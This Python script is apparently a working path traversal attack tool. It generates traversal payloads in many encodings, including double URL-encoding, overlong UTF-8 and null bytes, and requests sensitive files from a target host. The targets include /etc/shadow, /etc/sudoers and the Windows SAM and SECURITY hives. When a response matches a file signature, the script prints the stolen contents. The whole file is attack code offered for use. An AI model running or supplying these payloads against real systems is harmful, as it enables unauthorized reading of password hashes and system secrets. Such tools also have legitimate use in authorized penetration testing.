import argparse
import http.client
import sys
from urllib.parse import urlparse

def generate_payloads(max_depth=10, level=0):
    base_encodings = {
        "raw_forward": "../",
        "raw_backward": "..\\",
        "url_encoded_forward": "%2e%2e%2f",
        "url_encoded_backward": "%2e%2e%5c",
        "double_url_encoded_forward": "%252e%252e%252f",
        "double_url_encoded_backward": "%252e%252e%255c"
    }

    additional_encodings = {
        "double_slash": "..//",
        "mixed_slash_back": "..\\/",
        "mixed_slash_forward": "../\\",
        "dotless_php_style": "....//",
        "overlong_utf8": "%c0%ae%c0%ae%c0%af",
        "unicode_utf16": "%u002e%u002e%u002f",
        "null_byte_ending": "../etc/passwd%00",
        "url_encoded_null_byte": "%2e%2e%2f%00",
        "mixed_case_encoded": "%2E%2e%2F",
        "with_tab": "..%09/",
        "with_newline": "..%0a/",
        "with_cr": "..%0d/"
    }

    encodings = base_encodings.copy()
    if level == 1:
        encodings.update(additional_encodings)

    total_payloads = max_depth * len(encodings)
    print(f"[~] Generating {total_payloads} path traversal variations with level {level}...\n")

    for depth in range(1, max_depth + 1):
        for name, pattern in encodings.items():
            yield name, pattern * depth

def get_common_files(os_type):
    if os_type == "windows":
        return [
            "C:/Windows/win.ini", "C:/boot.ini", "C:/Windows/System32/drivers/etc/hosts", 
            "C:/Windows/System32/config/SAM", "C:/Windows/System32/config/SYSTEM", 
            "C:/Windows/System32/config/SECURITY", "C:/Windows/System32/config/software", 
            "C:/Windows/System32/config/default", "C:/Users/Administrator/NTUSER.DAT",
            "C:/Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup", 
            "C:/Windows/System32/cmd.exe", "C:/Windows/System32/hosts", "C:/Windows/System32/inetpub/wwwroot/",
            "C:/xampp/htdocs/", "C:/wamp64/www/", "C:/Windows/System32/winevt/Logs/",
            "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/", "C:/Users/<username>/AppData/Roaming/Microsoft/Windows/Recent/",
            "C:/Users/<username>/Documents/", "C:/Users/<username>/AppData/Local/"
        ]
    elif os_type == "linux":
        return [
            "/etc/passwd", "/etc/shadow", "/etc/hostname", "/etc/sudoers", "/etc/fstab", "/etc/network/interfaces", 
            "/etc/hosts", "/var/log/auth.log", "/var/log/syslog", "/var/log/messages", "/var/log/apache2/access.log", 
            "/var/log/apache2/error.log", "/var/www/html/", "/var/www/", "/etc/ssh/sshd_config", 
            "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf", "/home/<username>/", "/root/", "/etc/backup/",
            "/var/backups/"
        ]
    else:
        return []

def get_file_signatures():
    return {
        "/etc/passwd": ["root:x:0:0:", "daemon:x:1:"],
        "/etc/shadow": [":$6$", ":$1$"],
        "/etc/hostname": [],
        "/etc/sudoers": ["root    ALL=(ALL:ALL) ALL"],
        "/etc/fstab": ["LABEL=ROOT", "UUID="],
        "/etc/network/interfaces": ["iface", "auto", "inet"],
        "/etc/hosts": ["127.0.0.1", "::1"],
        "/var/log/auth.log": ["session opened", "authentication failure"],
        "/var/log/syslog": ["kernel", "systemd"],
        "/var/log/messages": ["kernel", "systemd"],
        "/var/log/apache2/access.log": ["GET", "POST", "200 OK"],
        "/var/log/apache2/error.log": ["error", "warning"],
        "/var/www/html/": [],
        "/var/www/": [],
        "/etc/ssh/sshd_config": ["PermitRootLogin", "PasswordAuthentication"],
        "/etc/apache2/apache2.conf": ["ServerName", "DocumentRoot"],
        "/etc/nginx/nginx.conf": ["user", "worker_processes"],
        "/home/<username>/": [],
        "/root/": [],
        "/etc/backup/": [],
        "/var/backups/": []
    }

def is_valid_response(file_path, response, known_files, signatures, content):
    if response.status == 404:
        return False

    file_path = file_path.replace("\\", "/")

    if file_path in known_files:
        sigs = signatures.get(file_path, [])
        if not sigs:
            return len(content) > 50
        for sig in sigs:
            if sig.lower() in content.lower():
                return True
        return False
    else:
        return False

def make_request(url):
    parsed_url = urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.hostname, parsed_url.port)
    conn.request("GET", parsed_url.path + "?" + parsed_url.query)
    response = conn.getresponse()
    raw = response.read()
    content = raw.decode("utf-8", errors="replace")  # Ensures full content is decoded
    return response, content

def main():
    parser = argparse.ArgumentParser(description="Advanced Path Traversal Scanner")
    parser.add_argument("-i", "--ip", required=True, help="Target IP")
    parser.add_argument("-p", "--port", required=True, help="Target port")
    parser.add_argument("-d", "--directory", required=True, help="Vulnerable directory path")
    parser.add_argument("--level", type=int, choices=[0, 1], default=0, help="Traversal encoding level (0=basic, 1=extended)")
    parser.add_argument("-O", "--os", choices=["windows", "linux"], help="Target OS type (optional)")
    parser.add_argument("--continue-on-success", action="store_true", help="Continue scanning after a match")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    if len(sys.argv) == 1 or any(arg not in sys.argv for arg in ["-i", "-p", "-d"]):
        print("Usage: python3 path.py -i <IP> -p <PORT> -d <DIRECTORY> [--level 0|1] [-O linux|windows] [--continue-on-success] [-v]")
        sys.exit(1)

    args = parser.parse_args()
    signatures = get_file_signatures()
    known_files = get_common_files(args.os) if args.os else []

    if args.os:
        files_to_try = known_files
    else:
        file_to_read = input("Specify a file > ").strip().lstrip("/")
        if not file_to_read.startswith("/"):
            file_to_read = "/" + file_to_read
        files_to_try = [file_to_read]
        known_files = files_to_try

    print("\n[~] Starting path traversal scan...\n")

    counter = 0
    printed_urls = set()

    for target_file in files_to_try:
        clean_target_file = target_file.lstrip("/")

        for technique, traversal in generate_payloads(max_depth=10, level=args.level):
            if args.directory.endswith("/"):
                url_path = f"{args.directory}{traversal}{clean_target_file}"
            else:
                url_path = f"{args.directory}/{traversal}{clean_target_file}"

            full_url = f"http://{args.ip}:{args.port}{url_path}"

            if full_url in printed_urls:
                continue
            printed_urls.add(full_url)
            counter += 1

            try:
                response, content = make_request(full_url)

                if args.verbose:
                    print(f"[{counter}] Tried: {full_url} -> Status: {response.status}")

                if not is_valid_response(target_file, response, known_files, signatures, content):
                    continue

                print(f"\n[{counter}] Technique: {technique}")
                print(f"[+] URL: {full_url}")
                print(f"Status: {response.status} {response.reason}")
                print("Content:\n")
                print(content)

                if not args.continue_on_success:
                    return

            except Exception as e:
                print(f"[{counter}] [!] Request failed: {e}")

if __name__ == "__main__":
    main()
